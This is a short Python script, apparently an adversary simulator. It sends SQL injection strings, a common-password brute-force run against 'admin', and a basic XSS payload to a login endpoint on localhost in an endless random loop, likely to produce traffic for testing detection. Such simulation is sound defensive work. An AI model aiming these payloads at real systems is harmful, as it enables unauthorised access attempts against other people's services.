import requests
import random
import time

BASE_URL = "http://localhost:5000"

def sql_injection_attack():
    payloads = ["' OR '1'='1", "admin' --", "UNION SELECT 1,2,3--"]
    for p in payloads:
        try:
            requests.post(f"{BASE_URL}/auth/login", data={'username': p, 'password': 'password'})
        except: pass
        time.sleep(0.5)

def brute_force_attack():
    target = "admin"
    passwords = ["123456", "password", "admin123", "root"]
    for p in passwords:
        try:
            requests.post(f"{BASE_URL}/auth/login", data={'username': target, 'password': p})
        except: pass
        time.sleep(0.2)

def xss_attack():
    payload = "<script>alert(1)</script>"
    try:
        # Attempt to inject into transfer description if we had one, or login
        requests.post(f"{BASE_URL}/auth/login", data={'username': payload, 'password': 'password'})
    except: pass

def run_adversary():
    print("Starting Adversary Simulation...")
    attacks = [sql_injection_attack, brute_force_attack, xss_attack]
    while True:
        attack = random.choice(attacks)
        attack()
        time.sleep(random.uniform(5, 15))

if __name__ == "__main__":
    run_adversary()
